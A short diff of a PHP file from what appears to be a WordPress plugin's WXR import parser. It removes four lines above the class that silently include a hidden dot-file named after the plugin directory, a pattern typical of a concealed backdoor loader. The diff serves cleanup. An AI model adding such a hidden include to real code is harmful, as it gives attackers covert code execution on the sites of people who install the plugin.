@@ -16,10 +16,6 @@ require_once dirname( __FILE__ ) . '/class-vc-wxr-parser-xml.php';
 /**
  * WordPress Importer class for managing parsing of WXR files.
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_WXR_Parser {
 	/**
 	 * @param $file
